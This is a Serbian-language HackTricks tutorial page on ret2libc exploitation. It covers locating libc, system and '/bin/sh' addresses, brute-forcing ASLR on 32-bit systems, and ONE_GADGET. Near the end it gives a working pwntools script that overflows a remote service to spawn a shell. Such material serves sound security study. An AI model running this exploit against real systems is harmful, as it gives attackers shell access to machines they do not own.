# Ret2lib

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje izvršnog toka ranjivog programa ka funkciji unutar deljene biblioteke (npr. **system**, **execve**, **strcpy**) umesto izvršavanja shell koda koji je dostavljen od strane napadača na steku. Napadač kreira payload koji modifikuje povratnu adresu na steku kako bi pokazivala ka željenoj funkciji biblioteke, dok istovremeno organizuje da svi neophodni argumenti budu ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (simplifikovan)**

* Dobiti adresu funkcije koja se poziva (npr. system) i komandu koja se poziva (npr. /bin/sh)
* Generisati ROP lanac da se prosledi prvi argument koji pokazuje ka stringu komande i izvršni tok ka funkciji

## Pronalaženje adresa

* Pretpostavljajući da se `libc` koji se koristi nalazi na trenutnoj mašini, možete pronaći gde će biti učitan u memoriju sa:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ako želite da proverite da li ASLR menja adresu libc-a, možete uraditi sledeće:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znajući korišćenu libc biblioteku, takođe je moguće pronaći offset do `system` funkcije sa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znajući korišćenu libc biblioteku, takođe je moguće pronaći offset do funkcije stringa `/bin/sh` sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korišćenje gdb-peda / GEF

Znajući koji se libc koristi, takođe je moguće koristiti Peda ili GEF da biste dobili adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Korišćenje /proc/\<PID>/maps

Ako proces stvara **dečije procese** svaki put kada komunicirate s njim (mrežni server), pokušajte **pročitati** taj fajl (verovatno će vam biti potrebna administratorska prava).

Ovde možete pronaći **tačno gde je učitan libc** unutar procesa i **gde će biti učitan** za svako dete procesa.

![](<../../../../.gitbook/assets/image (95).png>)

U ovom slučaju učitan je na **0xb75dc000** (Ovo će biti bazna adresa libc-a)

## Nepoznat libc

Moguće je da **ne znate koji libc učitava binarni fajl** (jer se možda nalazi na serveru do kojeg nemate pristup). U tom slučaju možete iskoristiti ranjivost da **procurete neke adrese i pronađete koji libc** biblioteka se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

I možete pronaći šablon pwntools-a za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Zaobilaženje ASLR-a u 32 bita

Ovi napadi brute-forcinga su **korisni samo za 32-bitne sisteme**.

* Ako je eksploatacija lokalna, možete pokušati brute-force baznu adresu libc-a (korisno za 32-bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ako napadate udaljeni server, možete pokušati **bruteforce-ovati adresu `libc` funkcije `usleep`**, prosleđujući kao argument 10 (na primer). Ako server u nekom trenutku **odgovori sa dodatnih 10 sekundi**, pronašli ste adresu ove funkcije.

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget) omogućava dobijanje shell-a umesto korišćenja **system** i **"/bin/sh". ONE\_GADGET** će pronaći unutar libc biblioteke način da se dobije shell koristeći samo jednu **ROP adresu**.\
Međutim, obično postoje neka ograničenja, najčešća i lako izbegnuta su poput `[rsp+0x30] == NULL`. Pošto kontrolišete vrednosti unutar **RSP**, samo treba poslati još nekoliko NULL vrednosti kako bi se ograničenje izbeglo.

![](<../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## Primer koda x86 Ret2lib

U ovom primeru ASLR brute-force je integrisan u kod i ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Primerak koda za Ret2lib

Proverite primer sa:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omogućava **procurivanje informacija iz procesa** pozivanjem `printf`/`puts` sa određenim podacima postavljenim kao argument.

## Ret2printf

Ovo u osnovi znači zloupotrebu **Ret2lib-a kako bi se transformisao u ranjivost formatiranja stringova za `printf`** koristeći `ret2lib` za pozivanje printf sa vrednostima kako bi se iskoristio (zvuči beskorisno ali je moguće):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
